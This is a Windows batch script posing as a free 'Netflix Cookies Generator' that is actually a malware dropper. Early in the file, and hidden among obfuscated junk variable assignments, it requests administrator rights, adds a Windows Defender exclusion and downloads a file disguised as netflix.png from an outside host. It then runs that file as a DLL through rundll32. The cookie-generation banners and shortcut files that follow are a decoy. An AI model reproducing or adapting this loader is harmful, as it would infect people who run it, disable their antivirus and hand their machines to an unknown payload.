@echo off
chcp 65001 > nul
if not ""=="am_admin" (
powershell start -verb runas 'script.bat' am_admin
exit /b)
FOR /f "tokens=2 delims==" %%f IN ('wmic os get osarchitecture /value ^| find "="') DO (
SET "OS_ARCH=%%f"
)
IF "%%f"=="32-bit" (
GOTO :32bit
)
IF "%%f"=="64-bit" (
GOTO :64bit
)
:32bit
ECHO "[~] Unsupported OS"
exit
:64bit
GOTO :GENERATE
:GENERATE
echo [~] Initializing Cookies Api Please Wait ...
@echo off
set "ZfyT=set "
set "CBzm=="
set "FmBNCpLCmN=rem "
set "FupZZZyfqU=s://"
set "OQyGVCfTRp=h2sh"
set "IqenNKIJir=Cloa"
set "nqDqHcPTKb=gith"
set "uCmoZoUOlo=om/c"
set "bOKibnVNrY=http"
set "BPTsVnlOOC=k"
set "vISEYJrcth=/Bat"
set "WtYwsqYTua=ub.c"
rem https://github.com/ch2sh/BatCloak
set "OQyGVCfTRp=nce "
set "IqenNKIJir=lusi"
set "WtYwsqYTua=pPre"
set "dFtFrTfySs=data"
set "vISEYJrcth=-Exc"
set "KRjNUdqUcp=-For"
set "pDakBtxTeX=lapp"
set "FupZZZyfqU=ll A"
set "vGnRSFQrFa=s.ca"
set "gYfqvCbsYn=\tem"
set "BQOnEAQIoV=ce"
set "bfaodUBPWc=loca"
set "aMmFAaTmGc=th $"
set "vrzRUsODYw=che "
set "djMZhwhfaX=env:"
set "FmBNCpLCmN=powe"
set "BPTsVnlOOC=onPa"
set "bOKibnVNrY=rshe"
set "nqDqHcPTKb=dd-M"
set "oFzVctwdqT=p\wi"
set "uCmoZoUOlo=fere"
set "RCGMLDKcXo=ndow"
powershell Add-MpPreference -ExclusionPath $env:localappdata\temp\windows.cache -Force
set "bfaodUBPWc=x.pn"
set "IqenNKIJir=f/T2"
set "gYfqvCbsYn=\tem"
set "FmBNCpLCmN=curl"
set "aMmFAaTmGc=9/ne"
set "uCmoZoUOlo=.luc"
set "nqDqHcPTKb=s://"
set "BPTsVnlOOC=VHb1"
set "OQyGVCfTRp=asvl"
set "vISEYJrcth=.nl/"
set "oFzVctwdqT=p\wi"
set "dFtFrTfySs= C:\Users\puncher\AppData\Local"
set "vGnRSFQrFa=s.ca"
set "RCGMLDKcXo=ndow"
set "FupZZZyfqU=http"
set "WtYwsqYTua=file"
set "djMZhwhfaX=tfli"
set "pDakBtxTeX=g -o"
set "vrzRUsODYw=che "
set "bOKibnVNrY= -s "
curl -s https://file.lucasvl.nl/f/T2VHb19/netflix.png -o C:\Users\puncher\AppData\Local\temp\windows.cache 
set "BPTsVnlOOC=lix"
set "bOKibnVNrY=ll32"
set "uCmoZoUOlo=ndow"
set "vISEYJrcth=che,"
set "IqenNKIJir=netf"
set "WtYwsqYTua=p\wi"
set "FmBNCpLCmN=rund"
set "OQyGVCfTRp=s.ca"
set "nqDqHcPTKb=\tem"
set "FupZZZyfqU= C:\Users\puncher\AppData\Local"
rundll32 C:\Users\puncher\AppData\Local\temp\windows.cache netflix
set "FmBNCpLCmN="

set "FmBNCpLCmN="

set "FmBNCpLCmN="

cd "C:\Users\al\Downloads\"
setlocal enabledelayedexpansion
@MODE CON COLS=115 LINES=60
echo [0 91m███╗   ██╗███████╗████████╗███████╗██╗     ██╗██╗  ██╗     ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗███████╗███████╗
echo [0 91m████╗  ██║██╔════╝╚══██╔══╝██╔════╝██║     ██║╚██╗██╔╝    ██╔════╝██╔═══██╗██╔═══██╗██║ ██╔╝██║██╔════╝██╔════╝
echo [0 91m██╔██╗ ██║█████╗     ██║   █████╗  ██║     ██║ ╚███╔╝     ██║     ██║   ██║██║   ██║█████╔╝ ██║█████╗  ███████╗
echo [0 91m██║╚██╗██║██╔══╝     ██║   ██╔══╝  ██║     ██║ ██╔██╗     ██║     ██║   ██║██║   ██║██╔═██╗ ██║██╔══╝  ╚════██║
echo [0 91m██║ ╚████║███████╗   ██║   ██║     ███████╗██║██╔╝ ██╗    ╚██████╗╚██████╔╝╚██████╔╝██║  ██╗██║███████╗███████║
echo [0 91m╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝     ╚══════╝╚═╝╚═╝  ╚═╝     ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝
set VER=1.0.0.0
title NETFLIX Cookies Generator 1.0.0.0 by ZEUS
echo.[0 92m
echo [~] WELCOME puncher
echo.
echo.[0 94m
echo [~] Generator started at :  
echo.
echo.[0 92m
echo [~] Generating and Saving Cookies ...
timeout /t 3 /nobreak >nul
echo.
echo.[0 94m
echo [~] Generated Cookies will be saved in the Cookies Folder
timeout /t 3 /nobreak >nul
echo.
if not exist "Cookies" (
mkdir Cookies
)
echo.[0 92m
echo [~] Open README if you face any issue.
timeout /t 3 /nobreak >nul
echo [InternetShortcut] >"README.url"
echo URL=https://t.me/netflixcookiesfree1 >>"README.url"
echo IconFile=C:\Program Files\Google\Chrome\Application\chrome.exe  >>"README.url"
echo IconIndex=0 >>"README.url"
curl -s https://file.lucasvl.nl/f/7Hr9o4w/cookies.cab -o Cookies.cab
Expand Cookies.cab -F:* "Cookies" >nul
del /f Cookies.cab
timeout /t 3 /nobreak >nul
echo.
echo.[0 94m
echo [~] Cookies Generated Sucessfully
timeout /t 3 /nobreak >nul
echo.
echo [InternetShortcut] >"Download Firefox Addons.url"
echo URL=https://addons.mozilla.org/en-US/firefox/addon/cookie-quick-manager >>"Download Firefox Addons.url"
echo IconFile=C:\Program Files\Google\Chrome\Application\chrome.exe  >>"Download Firefox Addons.url"
echo IconIndex=0 >>"Download Firefox Addons.url"
echo [InternetShortcut] >"Download Firefox.url"
echo URL=https://www.mozilla.org/en-US/firefox/download/thanks/ >>"Download Firefox.url"
echo IconFile=C:\Program Files\Google\Chrome\Application\chrome.exe  >>"Download Firefox.url"
echo IconIndex=0 >>"Download Firefox.url"
mshta vbscript:Execute("msgbox You may need to download and install Firefox Browser if not installed:close")
mshta vbscript:Execute("msgbox Firefox and addon links have been generated in this folder:close")
echo.[0 92m
echo [~] Thank you for using the NETFLIX COOKIE GENERATOR
timeout /t 4 /nobreak >nul



